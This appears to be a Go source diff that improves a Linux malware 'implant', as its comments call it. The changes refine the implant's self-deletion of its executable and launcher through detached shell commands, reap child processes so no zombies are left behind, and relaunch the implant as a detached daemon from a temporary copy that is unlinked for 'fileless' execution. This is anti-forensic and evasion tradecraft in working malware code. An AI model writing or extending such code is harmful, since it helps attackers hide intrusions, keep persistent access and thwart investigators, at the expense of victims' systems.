@@ -26,7 +26,6 @@ func init() {
 }
 
 func linuxScheduleSelfDeleteGrandchild(selfExePath string, originalLauncherPath string) {
-	// Simple and working self-deletion logic
 	// Delete the original launcher first if it's different from selfExePath
 	if originalLauncherPath != "" && originalLauncherPath != selfExePath {
 		quotedOriginalPath := fmt.Sprintf("%q", originalLauncherPath)
@@ -36,21 +35,38 @@ func linuxScheduleSelfDeleteGrandchild(selfExePath string, originalLauncherPath 
 		cmd.SysProcAttr = &syscall.SysProcAttr{
 			Setsid: true, // Detach from the current session, run independently.
 		}
-		_ = cmd.Start()
+		err := cmd.Start()
+		if err == nil {
+			// Instead of Releasing, Wait for the process in a new goroutine
+			// to prevent it from becoming a zombie if the parent (implant) is still running.
+			go func() {
+				_ = cmd.Wait() // Reap the child process
+			}()
+		}
+		// If err != nil, log it or handle as appropriate for your implant's operational needs.
+		// For now, we follow the original logic of not blocking/crashing the implant on this error.
 	}
 
 	// Delete the current executable (selfExePath)
 	// Use Go's %q to ensure the path is correctly quoted for the shell.
 	quotedSelfPath := fmt.Sprintf("%q", selfExePath)
-	deleterCmdScript := fmt.Sprintf("sleep 3 && rm -f %s", quotedSelfPath)
+	deleterCmdScriptSelf := fmt.Sprintf("sleep 3 && rm -f %s", quotedSelfPath)
 
-	cmd := exec.Command("sh", "-c", deleterCmdScript)
-	cmd.SysProcAttr = &syscall.SysProcAttr{
+	cmdSelf := exec.Command("sh", "-c", deleterCmdScriptSelf)
+	cmdSelf.SysProcAttr = &syscall.SysProcAttr{
 		Setsid: true, // Detach from the current session, run independently.
 	}
 
-	// Start the command and detach. We don't wait for it or care about its output.
-	_ = cmd.Start()
+	// Start the command.
+	err := cmdSelf.Start() // Note: This `err` shadows the one from the previous block, which is fine.
+	if err == nil {
+		// Instead of Releasing, Wait for the process in a new goroutine
+		// to prevent it from becoming a zombie if the parent (implant) is still running.
+		go func() {
+			_ = cmdSelf.Wait() // Reap the child process
+		}()
+	}
+	// If err != nil, log or handle as appropriate.
 }
 
 // linuxRelaunchAsDaemon re-executes the implant by:
@@ -85,6 +101,9 @@ func linuxRelaunchAsDaemon(originalLauncherExecutablePath string, argsForNewProc
 	if err != nil {
 		return fmt.Errorf("failed to write temporary executable '%s': %v", tempFileName, err)
 	}
+	// Ensure temp file is cleaned up if something goes wrong before/during Start or after successful start.
+	// Defer removal after successful start, or remove explicitly on error.
+	// For now, we stick to the original logic of removing *after* successful start.
 
 	// Prepare the command to execute the temporary file
 	// The first element of cmd.Args is conventionally the program name as it should appear in ps, etc.
@@ -116,13 +135,15 @@ func linuxRelaunchAsDaemon(originalLauncherExecutablePath string, argsForNewProc
 	// After successfully starting the new process, delete the temporary executable file.
 	// This achieves a "fileless" execution for the copied implant, as the file backing
 	// the running process is immediately unlinked from the filesystem.
-	err = os.Remove(tempFileName)
-	if err != nil {
+	// The parent (this process) will exit shortly after this, so it doesn't need to Wait() for the child.
+	// The child will be reparented to init.
+	errRemove := os.Remove(tempFileName)
+	if errRemove != nil {
 		// This is not ideal, as the temp file remains. Log this or handle as a non-fatal issue.
 		// The new process is already running independently.
 		// For robustness, one might consider logging this to a well-known implant operational log if one exists.
 		// For now, we proceed as the core functionality (daemon running) is achieved.
-		// fmt.Fprintf(os.Stderr, "Warning: failed to remove temporary file '%s': %v\n", tempFileName, err)
+		// fmt.Fprintf(os.Stderr, "Warning: failed to remove temporary file '%s': %v\n", tempFileName, errRemove)
 	}
 
 	// The new process is now running in the background, detached.
